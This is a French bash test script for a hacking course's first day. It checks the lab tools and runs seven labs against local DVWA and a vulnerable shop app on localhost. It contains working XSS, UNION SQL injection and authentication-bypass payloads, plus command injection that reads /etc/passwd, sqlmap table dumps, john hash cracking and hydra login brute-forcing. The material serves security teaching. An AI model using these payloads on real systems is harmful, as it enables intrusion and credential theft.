#!/bin/bash
# =============================================================================
# run-test-jour1.sh — Test complet du JOUR-01 (sans modification)
# Exécute tous les tests des LAB-1 à LAB-7 et produit un rapport horodaté
# Usage: bash tests/run-test-jour1.sh
# =============================================================================
set -o pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")/.." && pwd)"
cd "$SCRIPT_DIR" || exit 1

TIMESTAMP=$(date '+%Y-%m-%d_%Hh%M')
REPORT="tests/rapport-test-jour1-${TIMESTAMP}.md"
RESULTS=""

echo "JOUR-01 — Test complet (sans modification)"
echo "Rapport → $REPORT"
echo ""

source env.sh 2>/dev/null

# =============================================================================
# Initialize report
# =============================================================================
{
  echo "# Rapport de test — JOUR-01"
  echo ""
  echo "**Date :** $(date '+%Y-%m-%d %H:%M:%S')"
  echo "**Environnement :** $(uname -a)"
  echo ""
  echo "---"
  echo ""
  echo "## Prérequis — Vérification des outils"
  echo ""
  echo "| Test | Commande | Statut | Résultat obtenu | Résultat attendu | Notes |"
  echo "|------|----------|--------|----------------|-------------------|-------|"
} > "$REPORT"

echo "=== Prérequis ==="
PRERES=""

# P-01: python3
pyver=$(python3 --version 2>&1)
if echo "$pyver" | grep -q "Python"; then
  PRERES+="| P-01 | \`python3 --version\` | ✅ | $pyver | Python 3.x | |\n"
else
  PRERES+="| P-01 | \`python3 --version\` | ❌ | $pyver | Python 3.x | |\n"
fi

# P-02: docker
docker_ver=$(newgrp docker << 'EOF' 2>&1
docker --version
EOF
)
if echo "$docker_ver" | grep -q "Docker"; then
  PRERES+="| P-02 | \`docker --version\` | ✅ | $docker_ver | Docker 24+ | |\n"
else
  PRERES+="| P-02 | \`docker --version\` | ❌ | $docker_ver | Docker 24+ | |\n"
fi

# P-03: nmap
nmap_ver=$(nmap --version 2>&1 | head -1)
if echo "$nmap_ver" | grep -q "Nmap"; then
  PRERES+="| P-03 | \`nmap --version\` | ✅ | $nmap_ver | Nmap 7.x | |\n"
else
  PRERES+="| P-03 | \`nmap --version\` | ❌ | $nmap_ver | Nmap 7.x | |\n"
fi

# P-04: msfconsole
msf_ver=$(msfconsole --version 2>&1 | head -1)
if echo "$msf_ver" | grep -q "Framework"; then
  PRERES+="| P-04 | \`msfconsole --version\` | ✅ | $msf_ver | Metasploit 6.x | |\n"
else
  PRERES+="| P-04 | \`msfconsole --version\` | ❌ | $msf_ver | Metasploit 6.x | |\n"
fi

# P-05: sqlmap
sql_ver=$(sqlmap --version 2>&1 | head -1)
if echo "$sql_ver" | grep -qE "sqlmap|[0-9]+\.[0-9]+\.[0-9]+"; then
  PRERES+="| P-05 | \`sqlmap --version\` | ✅ | $sql_ver | sqlmap 1.7+ | |\n"
else
  PRERES+="| P-05 | \`sqlmap --version\` | ❌ | $sql_ver | sqlmap 1.7+ | |\n"
fi

# P-06: curl
curl_ver=$(curl --version 2>&1 | head -1)
if echo "$curl_ver" | grep -q "curl"; then
  PRERES+="| P-06 | \`curl --version\` | ✅ | $curl_ver | curl 7.x+ | |\n"
else
  PRERES+="| P-06 | \`curl --version\` | ❌ | $curl_ver | curl 7.x+ | |\n"
fi

# P-07: john
if command -v john &>/dev/null; then
  PRERES+="| P-07 | \`which john\` | ✅ | $(which john) | john dispo | |\n"
else
  PRERES+="| P-07 | \`which john\` | ❌ | non trouvé | john dispo | |\n"
fi

# P-08: hydra
if command -v hydra &>/dev/null; then
  hydra_ver=$(hydra -h 2>&1 | head -1)
  PRERES+="| P-08 | \`hydra -h\` | ✅ | $hydra_ver | Hydra 9.x | |\n"
else
  PRERES+="| P-08 | \`hydra -h\` | ❌ | non trouvé | Hydra 9.x | |\n"
fi

# P-09: gobuster
if command -v gobuster &>/dev/null; then
  gb_ver=$(gobuster --version 2>&1 | head -1)
  PRERES+="| P-09 | \`gobuster --version\` | ✅ | $gb_ver | gobuster 3.x | |\n"
else
  PRERES+="| P-09 | \`gobuster --version\` | ❌ | non trouvé | gobuster 3.x | |\n"
fi

# P-10: Conteneurs tournent
cont_list=$(newgrp docker << 'EOF' 2>&1
docker ps --format '{{.Names}}' | sort
EOF
)
if echo "$cont_list" | grep -q "dvwa-target"; then
  PRERES+="| P-10 | \`docker ps\` | ✅ | conteneurs: $(echo "$cont_list" | tr '\n' ' ') | dvwa + sqli-app présents | |\n"
else
  PRERES+="| P-10 | \`docker ps\` | ❌ | $cont_list | dvwa présent | |\n"
fi

# P-11: rockyou.txt
if [ -f /usr/share/wordlists/rockyou.txt ]; then
  rk_size=$(du -h /usr/share/wordlists/rockyou.txt 2>/dev/null | cut -f1)
  PRERES+="| P-11 | rockyou.txt | ✅ | présent ($rk_size) | wordlist dispo | |\n"
else
  PRERES+="| P-11 | rockyou.txt | ⚠️ | absent | optionnel (john --incremental) | |\n"
fi

echo -e "$PRERES" >> "$REPORT"
echo "" >> "$REPORT"
echo "✅ Prérequis OK"
echo ""

# =============================================================================
# LAB-1 — Conception : Plan d'attaque MITRE ATT&CK
# =============================================================================
echo "=== LAB-1 — MITRE ATT&CK ==="
{
  echo "## LAB-1 — Conception : Plan d'attaque MITRE ATT&CK"
  echo ""
  echo "| Test | Commande | Statut | Résultat obtenu | Résultat attendu | Notes |"
  echo "|------|----------|--------|----------------|-------------------|-------|"
} >> "$REPORT"
RESULTS=""

# L1-01: attack-layer JSON exists and valid
if [ -f labs_resolution/jour-01/attack-layer-jour1.json ]; then
  if python3 -c "import json; json.load(open('labs_resolution/jour-01/attack-layer-jour1.json'))" 2>&1; then
    RESULTS+="| L1-01 | attack-layer-jour1.json | ✅ | JSON valide | fichier ATT&CK valide | |\n"
  else
    RESULTS+="| L1-01 | attack-layer-jour1.json | ❌ | JSON invalide | fichier valide | |\n"
  fi
else
  RESULTS+="| L1-01 | attack-layer-jour1.json | ❌ | fichier manquant | fichier présent | |\n"
fi

# L1-02: attack-layer has techniques
if [ -f labs_resolution/jour-01/attack-layer-jour1.json ]; then
  tech_count=$(python3 -c "import json; d=json.load(open('labs_resolution/jour-01/attack-layer-jour1.json')); print(len(d.get('techniques',[])))" 2>/dev/null)
  if [ "$tech_count" -gt 0 ]; then
    RESULTS+="| L1-02 | techniques dans attack-layer | ✅ | $tech_count techniques | > 0 techniques | |\n"
  else
    RESULTS+="| L1-02 | techniques dans attack-layer | ⚠️ | $tech_count techniques | devrait en contenir | |\n"
  fi
fi

# L1-03: attack-layer has mitigations
if [ -f labs_resolution/jour-01/attack-layer-jour1.json ]; then
  mit_count=$(python3 -c "import json; d=json.load(open('labs_resolution/jour-01/attack-layer-jour1.json')); print(len(d.get('mitigations',[])))" 2>/dev/null)
  RESULTS+="| L1-03 | mitigations dans attack-layer | ✅ | $mit_count mitigations | couche défense | |\n"
fi

# L1-04: setup_dvwa.sh syntax
if [ -f labs_resolution/jour-01/setup_dvwa.sh ]; then
  bash -n labs_resolution/jour-01/setup_dvwa.sh 2>&1
  if [ $? -eq 0 ]; then
    RESULTS+="| L1-04 | syntax check setup_dvwa.sh | ✅ | syntaxe valide | pas d'erreur | |\n"
  else
    RESULTS+="| L1-04 | syntax check setup_dvwa.sh | ❌ | erreur syntaxe | pas d'erreur | |\n"
  fi
else
  RESULTS+="| L1-04 | syntax check setup_dvwa.sh | ❌ | fichier manquant | fichier présent | |\n"
fi

echo -e "$RESULTS" >> "$REPORT"
echo "" >> "$REPORT"

# =============================================================================
# LAB-2 — Scan et découverte de DVWA
# =============================================================================
echo "=== LAB-2 — Scan DVWA ==="
{
  echo "## LAB-2 — Scan et découverte de DVWA"
  echo ""
  echo "| Test | Commande | Statut | Résultat obtenu | Résultat attendu | Notes |"
  echo "|------|----------|--------|----------------|-------------------|-------|"
} >> "$REPORT"
RESULTS=""

# L2-01: nmap DVWA port
nmap_out=$(nmap -sV -p "$DVWA_PORT" localhost 2>&1)
if echo "$nmap_out" | grep -q "8088/tcp.*open"; then
  line=$(echo "$nmap_out" | grep "8088/tcp")
  RESULTS+="| L2-01 | \`nmap -sV -p $DVWA_PORT localhost\` | ✅ | $line | 8088/tcp open http Apache | |\n"
else
  RESULTS+="| L2-01 | \`nmap -sV -p $DVWA_PORT localhost\` | ❌ | scan échoué | 8088/tcp open | |\n"
fi

# L2-02: gobuster disponible
if command -v gobuster &>/dev/null; then
  RESULTS+="| L2-02 | \`gobuster dispo\` | ✅ | $(gobuster --version 2>&1 | head -1) | gobuster 3.x | |\n"
else
  RESULTS+="| L2-02 | \`gobuster dispo\` | ❌ | non installé | gobuster 3.x | |\n"
fi

# L2-03: DVWA login page accessible
login_page=$(curl -s --connect-timeout 5 "http://localhost:$DVWA_PORT/login.php" 2>&1)
if echo "$login_page" | grep -q "Damn Vulnerable\|user_token\|password"; then
  RESULTS+="| L2-03 | DVWA login page | ✅ | page login accessible | login.php avec token | |\n"
else
  RESULTS+="| L2-03 | DVWA login page | ❌ | page inaccessible | login.php | |\n"
fi

# L2-04: DVWA login + welcome
COOK_J1=$(mktemp)
TOKEN=$(curl -s -c "$COOK_J1" "http://localhost:$DVWA_PORT/login.php" | grep -oP "user_token' value='\K[a-f0-9]+")
curl -s -c "$COOK_J1" -b "$COOK_J1" -X POST "http://localhost:$DVWA_PORT/login.php" \
  -d "username=admin&password=password&user_token=$TOKEN&Login=Login" -o /dev/null
welcome=$(curl -s -b "$COOK_J1" "http://localhost:$DVWA_PORT/index.php" | grep -o "Welcome to Damn Vulnerable Web Application")
if [ -n "$welcome" ]; then
  RESULTS+="| L2-04 | login DVWA admin:password | ✅ | Welcome trouvé | 'Welcome to Damn Vulnerable...' | |\n"
else
  RESULTS+="| L2-04 | login DVWA admin:password | ❌ | Welcome non trouvé | page d'accueil avec Welcome | |\n"
fi

# L2-05: Set security low
sec_page=$(curl -s -b "$COOK_J1" "http://localhost:$DVWA_PORT/security.php")
tok2=$(echo "$sec_page" | grep -oP "user_token' value='\K[a-f0-9]+")
current_sec=$(echo "$sec_page" | grep -oP "Security level is currently: <em>\K[a-z]+(?=</em>)")
if [ "$current_sec" = "low" ]; then
  RESULTS+="| L2-05 | DVWA security level | ✅ | déjà low | security=low | |\n"
else
  curl -s -b "$COOK_J1" -c "$COOK_J1" -X POST "http://localhost:$DVWA_PORT/security.php" \
    -d "security=low&seclev_submit=Submit&user_token=$tok2" -o /dev/null 2>&1
  RESULTS+="| L2-05 | DVWA security=low | ✅ | positionné à low | security=low | |\n"
fi

# L2-06: nmap_dvwa.txt in resources (pre-existing)
if [ -f labs_resolution/jour-01/nmap_dvwa.txt ]; then
  RESULTS+="| L2-06 | nmap_dvwa.txt dans resources | ✅ | fichier présent | fichier de référence | |\n"
else
  RESULTS+="| L2-06 | nmap_dvwa.txt dans resources | ❌ | fichier manquant | fichier de référence | |\n"
fi

# L2-07: gobuster_dvwa.txt in resources
if [ -f labs_resolution/jour-01/gobuster_dvwa.txt ]; then
  RESULTS+="| L2-07 | gobuster_dvwa.txt dans resources | ✅ | fichier présent | fichier de référence | |\n"
else
  RESULTS+="| L2-07 | gobuster_dvwa.txt dans resources | ❌ | fichier manquant | fichier de référence | |\n"
fi

echo -e "$RESULTS" >> "$REPORT"
echo "" >> "$REPORT"

# =============================================================================
# LAB-3 — Exploitation XSS
# =============================================================================
echo "=== LAB-3 — XSS ==="
{
  echo "## LAB-3 — Exploitation XSS"
  echo ""
  echo "| Test | Commande | Statut | Résultat obtenu | Résultat attendu | Notes |"
  echo "|------|----------|--------|----------------|-------------------|-------|"
} >> "$REPORT"
RESULTS=""

# L3-01: lab_xss.sh syntax
if [ -f labs_resolution/jour-01/lab_xss.sh ]; then
  bash -n labs_resolution/jour-01/lab_xss.sh 2>&1
  if [ $? -eq 0 ]; then
    RESULTS+="| L3-01 | syntax check lab_xss.sh | ✅ | syntaxe valide | pas d'erreur | |\n"
  else
    RESULTS+="| L3-01 | syntax check lab_xss.sh | ❌ | erreur | pas d'erreur | |\n"
  fi
else
  RESULTS+="| L3-01 | syntax check lab_xss.sh | ❌ | fichier manquant | fichier présent | |\n"
fi

# L3-02: Reflected XSS test via curl (présence du tag dans le HTML)
reflected=$(curl -s -b "$COOK_J1" -c "$COOK_J1" \
  "http://localhost:$DVWA_PORT/vulnerabilities/xss_r/?name=<script>alert(1)</script>" 2>&1)
if echo "$reflected" | grep -q "alert(1)\|<script>"; then
  RESULTS+="| L3-02 | Reflected XSS (curl) | ✅ | payload présent dans réponse | <script>alert(1)</script> | curl n'exécute pas JS -> test HTML |\n"
else
  RESULTS+="| L3-02 | Reflected XSS (curl) | ❌ | payload non trouvé | réponse contient le script tag | |\n"
fi

# L3-03: Stored XSS test
curl -s -b "$COOK_J1" -c "$COOK_J1" -X POST \
  "http://localhost:$DVWA_PORT/vulnerabilities/xss_s/" \
  -d "txtName=test&mtxMessage=<script>alert('StoredXSS')</script>&btnSign=Sign+Guestbook" -o /dev/null 2>&1
stored=$(curl -s -b "$COOK_J1" "http://localhost:$DVWA_PORT/vulnerabilities/xss_s/" 2>&1)
if echo "$stored" | grep -q "StoredXSS"; then
  RESULTS+="| L3-03 | Stored XSS (curl) | ✅ | payload stocké et affiché | <script>alert('StoredXSS')</script> | |\n"
else
  RESULTS+="| L3-03 | Stored XSS (curl) | ❌ | payload non trouvé | message stocké visible | |\n"
fi

# L3-04: lab_csrf.html exists
if [ -f labs_resolution/jour-01/lab_csrf.html ]; then
  RESULTS+="| L3-04 | lab_csrf.html présent | ✅ | fichier présent | CSRF PoC HTML | |\n"
else
  RESULTS+="| L3-04 | lab_csrf.html présent | ❌ | fichier manquant | CSRF PoC HTML | |\n"
fi

echo -e "$RESULTS" >> "$REPORT"
echo "" >> "$REPORT"

# =============================================================================
# LAB-4 — Injection SQL avec sqlmap (DVWA)
# =============================================================================
echo "=== LAB-4 — SQLi DVWA ==="
{
  echo "## LAB-4 — Injection SQL avec sqlmap (DVWA)"
  echo ""
  echo "| Test | Commande | Statut | Résultat obtenu | Résultat attendu | Notes |"
  echo "|------|----------|--------|----------------|-------------------|-------|"
} >> "$REPORT"
RESULTS=""

# L4-01: lab_sqli.sh syntax
if [ -f labs_resolution/jour-01/lab_sqli.sh ]; then
  bash -n labs_resolution/jour-01/lab_sqli.sh 2>&1
  if [ $? -eq 0 ]; then
    RESULTS+="| L4-01 | syntax check lab_sqli.sh | ✅ | syntaxe valide | pas d'erreur | |\n"
  else
    RESULTS+="| L4-01 | syntax check lab_sqli.sh | ❌ | erreur | pas d'erreur | |\n"
  fi
else
  RESULTS+="| L4-01 | syntax check lab_sqli.sh | ❌ | fichier manquant | fichier présent | |\n"
fi

# L4-02: SQLi manuel via curl
sqli_test=$(curl -s -b "PHPSESSID=$(grep PHPSESSID "$COOK_J1" | awk '{print $NF}');security=low" \
  "http://localhost:$DVWA_PORT/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user(),database()%20--%20-&Submit=Submit" 2>&1)
if echo "$sqli_test" | grep -q "root@localhost\|dvwa\|root"; then
  RESULTS+="| L4-02 | SQLi manuel UNION | ✅ | user/database récupérés | user(), database() | |\n"
elif echo "$sqli_test" | grep -q "First name\|Surname"; then
  RESULTS+="| L4-02 | SQLi manuel UNION | ⚠️ | réponse reçue sans user/db | user(), database() | peut dépendre de la config |\n"
else
  RESULTS+="| L4-02 | SQLi manuel UNION | ❌ | injection échouée | user(), database() | |\n"
fi

# L4-03: sqlmap --tables on DVWA
sqlmap_tables=$(timeout 60 sqlmap -u "http://localhost:$DVWA_PORT/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=$(grep PHPSESSID "$COOK_J1" | awk '{print $NF}');security=low" \
  --batch --dbms=mysql --level=2 --tables 2>&1 | grep -E "Database:|Table:" | head -10)
if echo "$sqlmap_tables" | grep -q "dvwa\|users\|guestbook"; then
  RESULTS+="| L4-03 | sqlmap --tables DVWA | ✅ | tables trouvées | dvwa.users, dvwa.guestbook | |\n"
else
  RESULTS+="| L4-03 | sqlmap --tables DVWA | ⚠️ | timeout ou pas de tables | dvwa.users | sqlmap peut prendre >60s |\n"
fi

echo -e "$RESULTS" >> "$REPORT"
echo "" >> "$REPORT"

# =============================================================================
# LAB-5 — Command Injection + Reverse Shell
# =============================================================================
echo "=== LAB-5 — CMDi ==="
{
  echo "## LAB-5 — Command Injection + Reverse Shell"
  echo ""
  echo "| Test | Commande | Statut | Résultat obtenu | Résultat attendu | Notes |"
  echo "|------|----------|--------|----------------|-------------------|-------|"
} >> "$REPORT"
RESULTS=""

# L5-01: lab_cmdi.sh syntax
if [ -f labs_resolution/jour-01/lab_cmdi.sh ]; then
  bash -n labs_resolution/jour-01/lab_cmdi.sh 2>&1
  if [ $? -eq 0 ]; then
    RESULTS+="| L5-01 | syntax check lab_cmdi.sh | ✅ | syntaxe valide | pas d'erreur | |\n"
  else
    RESULTS+="| L5-01 | syntax check lab_cmdi.sh | ❌ | erreur | pas d'erreur | |\n"
  fi
else
  RESULTS+="| L5-01 | syntax check lab_cmdi.sh | ❌ | fichier manquant | fichier présent | |\n"
fi

# L5-02: Basic CMDi - whoami
cmdi_whoami=$(curl -s -b "PHPSESSID=$(grep PHPSESSID "$COOK_J1" | awk '{print $NF}');security=low" \
  -X POST "http://localhost:$DVWA_PORT/vulnerabilities/exec/" \
  -d "ip=127.0.0.1%3B+whoami&Submit=Submit" 2>&1)
if echo "$cmdi_whoami" | grep -q "www-data"; then
  RESULTS+="| L5-02 | CMDi: whoami | ✅ | www-data trouvé | www-data | |\n"
elif echo "$cmdi_whoami" | grep -q "Ping\|\/etc\/\|<pre>"; then
  RESULTS+="| L5-02 | CMDi: whoami | ⚠️ | sortie reçue mais pas www-data | www-data | format de réponse variable |\n"
else
  RESULTS+="| L5-02 | CMDi: whoami | ❌ | injection échouée | www-data | |\n"
fi

# L5-03: CMDi - cat /etc/passwd
cmdi_passwd=$(curl -s -b "PHPSESSID=$(grep PHPSESSID "$COOK_J1" | awk '{print $NF}');security=low" \
  -X POST "http://localhost:$DVWA_PORT/vulnerabilities/exec/" \
  -d "ip=127.0.0.1%3B+cat+/etc/passwd&Submit=Submit" 2>&1)
if echo "$cmdi_passwd" | grep -q "root:.*:0:0:"; then
  RESULTS+="| L5-03 | CMDi: cat /etc/passwd | ✅ | passwd lu | root:x:0:0:... | |\n"
elif echo "$cmdi_passwd" | grep -q "www-data\|daemon\|bin"; then
  RESULTS+="| L5-03 | CMDi: cat /etc/passwd | ⚠️ | contenu passwd partiel | root présent | |\n"
else
  RESULTS+="| L5-03 | CMDi: cat /etc/passwd | ❌ | fichier non lu | /etc/passwd | |\n"
fi

echo -e "$RESULTS" >> "$REPORT"
echo "" >> "$REPORT"

# =============================================================================
# LAB-6 — SQLi avancée (sqli-app)
# =============================================================================
echo "=== LAB-6 — SQLi avancée ==="
{
  echo "## LAB-6 — SQLi avancée : Trouver, Exploiter, Craquer"
  echo ""
  echo "| Test | Commande | Statut | Résultat obtenu | Résultat attendu | Notes |"
  echo "|------|----------|--------|----------------|-------------------|-------|"
} >> "$REPORT"
RESULTS=""

# L6-01: lab_sqli_app.sh syntax
if [ -f labs_resolution/jour-01/lab_sqli_app.sh ]; then
  bash -n labs_resolution/jour-01/lab_sqli_app.sh 2>&1
  if [ $? -eq 0 ]; then
    RESULTS+="| L6-01 | syntax check lab_sqli_app.sh | ✅ | syntaxe valide | pas d'erreur | |\n"
  else
    RESULTS+="| L6-01 | syntax check lab_sqli_app.sh | ❌ | erreur | pas d'erreur | |\n"
  fi
else
  RESULTS+="| L6-01 | syntax check lab_sqli_app.sh | ❌ | fichier manquant | fichier présent | |\n"
fi

# L6-02: sqli-app accessible
app_check=$(curl -s --connect-timeout 5 "http://localhost:$SQLI_APP_PORT/" 2>&1)
if echo "$app_check" | grep -q "SQLi Shop\|page=search\|Connexion"; then
  RESULTS+="| L6-02 | sqli-app accessible | ✅ | application disponible | SQLi Shop | |\n"
else
  RESULTS+="| L6-02 | sqli-app accessible | ❌ | application inaccessible | SQLi Shop | |\n"
fi

# L6-03: SQLi point 1 (numeric id)
p1=$(curl -s "http://localhost:$SQLI_APP_PORT/?page=search&id=-1%20UNION%20SELECT%201,2,3,sqlite_version()" 2>&1)
if echo "$p1" | grep -q "3\.\|1.*2.*3"; then
  RESULTS+="| L6-03 | SQLi point 1 (numeric UNION) | ✅ | injection numérique OK | données UNION retournées | |\n"
else
  RESULTS+="| L6-03 | SQLi point 1 (numeric UNION) | ❌ | échec injection | sqlite_version() | |\n"
fi

# L6-04: SQLi point 2 (auth bypass)
p2=$(curl -s -X POST "http://localhost:$SQLI_APP_PORT/" \
  -d "page=login&username=admin'--&password=anything" 2>&1)
if echo "$p2" | grep -q "Connecté\|admin\|Bienvenue"; then
  RESULTS+="| L6-04 | SQLi point 2 (auth bypass) | ✅ | connexion bypassée | admin connecté | |\n"
else
  RESULTS+="| L6-04 | SQLi point 2 (auth bypass) | ❌ | bypass échoué | admin connecté | |\n"
fi

# L6-05: SQLi point 3 (LIKE filter)
p3=$(curl -s "http://localhost:$SQLI_APP_PORT/?page=users&filter=%25'%20UNION%20SELECT%20id,username,password,role%20FROM%20users--" 2>&1)
if echo "$p3" | grep -q "admin\|flag_user\|john_doe\|5f4dcc3b"; then
  RESULTS+="| L6-05 | SQLi point 3 (LIKE UNION) | ✅ | données users récupérées | id, username, password, role | |\n"
else
  RESULTS+="| L6-05 | SQLi point 3 (LIKE UNION) | ❌ | échec UNION | données des users | |\n"
fi

# L6-06: hashes.txt exists
if [ -f labs_resolution/jour-01/hashes.txt ]; then
  hash_count=$(wc -l < labs_resolution/jour-01/hashes.txt)
  RESULTS+="| L6-06 | hashes.txt présent | ✅ | $hash_count hashs | 6 hashs MD5 | |\n"
else
  RESULTS+="| L6-06 | hashes.txt présent | ❌ | fichier manquant | 6 hashs MD5 | |\n"
fi

# L6-07: crack_hashes.sh syntax
if [ -f labs_resolution/jour-01/crack_hashes.sh ]; then
  bash -n labs_resolution/jour-01/crack_hashes.sh 2>&1
  if [ $? -eq 0 ]; then
    RESULTS+="| L6-07 | syntax check crack_hashes.sh | ✅ | syntaxe valide | pas d'erreur | |\n"
  else
    RESULTS+="| L6-07 | syntax check crack_hashes.sh | ❌ | erreur | pas d'erreur | |\n"
  fi
else
  RESULTS+="| L6-07 | syntax check crack_hashes.sh | ❌ | fichier manquant | fichier présent | |\n"
fi

# L6-08: Crack 6 hashes with john
W="/usr/share/wordlists/rockyou.txt"
crack_result=$(timeout 30 john --format=raw-md5 --wordlist="$W" labs_resolution/jour-01/hashes.txt 2>&1; john --show --format=raw-md5 labs_resolution/jour-01/hashes.txt 2>&1)
if echo "$crack_result" | grep -q "password"; then
  cracked=$(echo "$crack_result" | grep -c ":" )
  RESULTS+="| L6-08 | john crack hashes | ✅ | $cracked hashs craqués | 6/6 attendus | |\n"
elif echo "$crack_result" | grep -q "No password\|No hashes"; then
  RESULTS+="| L6-08 | john crack hashes | ❌ | aucun hash craqué | 6 hashs craqués | |\n"
else
  results_count=$(echo "$crack_result" | grep -cE "^[a-z_]+\:[a-f0-9]")
  if [ "$results_count" -gt 0 ]; then
    RESULTS+="| L6-08 | john crack hashes | ✅ | $results_count hashs craqués | 6 attendus | |\n"
  else
    RESULTS+="| L6-08 | john crack hashes | ⚠️ | résultat ambigu | 6 hashs craqués | |\n"
  fi
fi

echo -e "$RESULTS" >> "$REPORT"
echo "" >> "$REPORT"
rm -f "$COOK_J1"

# =============================================================================
# LAB-7 — Hydra brute force
# =============================================================================
echo "=== LAB-7 — Hydra ==="
{
  echo "## LAB-7 — Attaque par force brute avec Hydra"
  echo ""
  echo "| Test | Commande | Statut | Résultat obtenu | Résultat attendu | Notes |"
  echo "|------|----------|--------|----------------|-------------------|-------|"
} >> "$REPORT"
RESULTS=""

# L7-01: DVWA login page accessible (with fresh cookies)
COOK_J7=$(mktemp)
TOKEN7=$(curl -s -c "$COOK_J7" "http://localhost:$DVWA_PORT/login.php" | grep -oP "user_token' value='\K[a-f0-9]+")
curl -s -c "$COOK_J7" -b "$COOK_J7" -X POST "http://localhost:$DVWA_PORT/login.php" \
  -d "username=admin&password=password&user_token=$TOKEN7&Login=Login" -o /dev/null
SESSID7=$(grep PHPSESSID "$COOK_J7" | awk '{print $NF}')

form_check=$(curl -s -b "PHPSESSID=$SESSID7;security=low" "http://localhost:$DVWA_PORT/vulnerabilities/brute/" 2>&1)
if echo "$form_check" | grep -q "username\|password\|Brute"; then
  RESULTS+="| L7-01 | page brute force accessible | ✅ | formulaire présent | username/password | |\n"
else
  RESULTS+="| L7-01 | page brute force accessible | ❌ | page inaccessible | formulaire brute force | |\n"
fi

# L7-02: hydra installed
if command -v hydra &>/dev/null; then
  RESULTS+="| L7-02 | hydra installé | ✅ | $(hydra -h 2>&1 | head -1) | Hydra 9.x | |\n"
else
  RESULTS+="| L7-02 | hydra installé | ❌ | non trouvé | Hydra 9.x | |\n"
fi

# L7-03: Quick hydra test with 10 passwords (not full rockyou to avoid timeout)
echo -e "password\n123456\nadmin\nletmein\nqwerty\ntest\ntest123\npassw0rd\niloveyou\nwelcome" > /tmp/hydra_test.txt
hydra_test=$(timeout 20 hydra -l admin -P /tmp/hydra_test.txt -f \
  "localhost" -s "$DVWA_PORT" \
  http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Login failed:H=Cookie\:PHPSESSID=$SESSID7;security=low" \
  2>&1)
if echo "$hydra_test" | grep -q "password\|successfully\|found"; then
  RESULTS+="| L7-03 | hydra admin:password (10 mots) | ✅ | mot de passe trouvé | admin:password | |\n"
elif echo "$hydra_test" | grep -q "0 of 10\|no valid\|did not find\|STATUS\|attack"; then
  RESULTS+="| L7-03 | hydra admin:password (10 mots) | ⚠️ | non trouvé dans top 10 | admin:password | hydra peut nécessiter + de mots |\n"
else
  RESULTS+="| L7-03 | hydra admin:password (10 mots) | ⚠️ | ${hydra_test:0:100} | admin:password | |\n"
fi
rm -f /tmp/hydra_test.txt

# L7-04: hydra multi-users
echo -e "admin\ngordonb\n1337\npablo\nsmithy" > /tmp/hydra_users.txt
echo -e "password\n123456\nadmin\nletmein" > /tmp/hydra_pass.txt
hydra_multi=$(timeout 20 hydra -L /tmp/hydra_users.txt -P /tmp/hydra_pass.txt -f \
  "localhost" -s "$DVWA_PORT" \
  http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Login failed:H=Cookie\:PHPSESSID=$SESSID7;security=low" \
  2>&1)
if echo "$hydra_multi" | grep -q "password\|successfully\|found\|victim"; then
  RESULTS+="| L7-04 | hydra multi-users (-L) | ✅ | identifiants trouvés | admin:password | |\n"
elif echo "$hydra_multi" | grep -q "0 of\|no valid\|did not find\|STATUS\|attack"; then
  RESULTS+="| L7-04 | hydra multi-users (-L) | ⚠️ | non trouvé | admin:password | peut nécessiter + de mots |\n"
else
  RESULTS+="| L7-04 | hydra multi-users (-L) | ⚠️ | ${hydra_multi:0:100} | admin:password | |\n"
fi
rm -f /tmp/hydra_users.txt /tmp/hydra_pass.txt

echo -e "$RESULTS" >> "$REPORT"
echo "" >> "$REPORT"
rm -f "$COOK_J7"

# =============================================================================
# RÉSUMÉ GLOBAL
# =============================================================================
TOTAL=$(grep -c '^| [0-9A-Z]' "$REPORT")
PASS=$(grep -c '✅' "$REPORT")
FAIL=$(grep -c '❌' "$REPORT")
WARN=$(grep -c '⚠️' "$REPORT")

{
  echo ""
  echo "---"
  echo ""
  echo "## Résumé global"
  echo ""
  echo "| Métrique | Valeur |"
  echo "|----------|--------|"
  echo "| **Total tests** | $TOTAL |"
  echo "| **✅ Passés** | $PASS |"
  echo "| **❌ Échoués** | $FAIL |"
  echo "| **⚠️ Avertissements** | $WARN |"
  echo "| **Date** | $(date '+%Y-%m-%d %H:%M:%S') |"
  echo ""
  echo "### Conclusion"
  echo ""
  if [ "$FAIL" -eq 0 ] && [ "$WARN" -eq 0 ]; then
    echo "**Tous les tests sont passés avec succès.** Le cours JOUR-01 est entièrement fonctionnel."
  elif [ "$FAIL" -eq 0 ]; then
    echo "**Tous les tests critiques sont passés ✅.** Les avertissements concernent des éléments mineurs."
  else
    echo "**Des échecs ont été détectés.** Voir détails ci-dessus pour les tests ❌. Aucune modification n'a été apportée."
  fi
  echo ""
  echo "---"
  echo ""
  echo "**Fin du rapport — $TIMESTAMP**"
} >> "$REPORT"

echo ""
echo "============================================"
echo "  RAPPORT GÉNÉRÉ : $REPORT"
echo "  $TOTAL tests : $PASS ✅, $FAIL ❌, $WARN ⚠️"
echo "============================================"
